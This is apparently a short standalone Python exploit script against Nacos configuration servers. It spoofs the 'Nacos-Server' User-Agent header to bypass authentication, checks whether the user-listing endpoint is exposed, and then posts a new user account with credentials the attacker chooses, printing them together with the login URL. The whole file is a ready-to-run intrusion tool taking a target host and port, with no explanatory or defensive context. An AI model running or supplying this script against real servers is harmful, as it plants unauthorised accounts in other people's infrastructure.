#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import requests

headers = {
    "User-Agent": "Nacos-Server"
}

def check(target):
    endpoint = "/nacos/v1/auth/users?pageNo=1&pageSize=9"
    r = requests.get(target.strip("/") + endpoint, headers=headers)
    if r.status_code == 200 and "pageItems" in r.text:
        print(target + " has vulnerabilities")
        return True
    print(target + " not vulnerable")
    return False

def add_user(target, username, password):
    add_user_endpoint = "/nacos/v1/auth/users?username={}&password={}".format(username, password)
    r = requests.post(target.strip("/") + add_user_endpoint, headers=headers)
    if r.status_code == 200 and "create user ok" in r.text:
        print("Add User Success")
        print("New User Info: {}/{}".format(username, password))
        print("Nacos Login Endpoint: {}/nacos/".format(target))
        exit(1)
    print("Add User Failed")

if __name__ == '__main__':
    if len(sys.argv) != 5:
        print("Usage: nacos.py <RHOST> <RPORT> <username> <password>")
        exit(-1)

    rhost = sys.argv[1]
    rport = int(sys.argv[2])
    username = sys.argv[3]
    password = sys.argv[4]
    target = "http://{}:{}".format(rhost, rport)

    if check(target):
        add_user(target, username, password)
                                                 